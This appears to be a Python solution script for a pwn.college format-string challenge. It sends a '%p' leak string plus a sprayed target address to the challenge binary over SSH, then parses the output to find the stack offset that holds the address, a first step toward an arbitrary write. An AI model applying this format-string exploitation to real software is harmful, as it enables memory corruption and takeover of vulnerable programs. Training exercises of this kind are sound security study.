import subprocess
import struct

ADDR = 0x4040E0
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

fmt = ("AAA " + "%p " * 80).encode()
spray = b""
for shift in range(8):
    spray += b"\x00" * shift + struct.pack("<Q", ADDR)

payload = fmt + spray
res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
out = res.stdout.decode("latin-1", errors="ignore")

for line in out.splitlines():
    if line.startswith("AAA "):
        tokens = line.split()[1:]
        for i, tok in enumerate(tokens, start=1):
            if tok.lower().startswith("0x4040e0"):
                print(i, tok)
        break
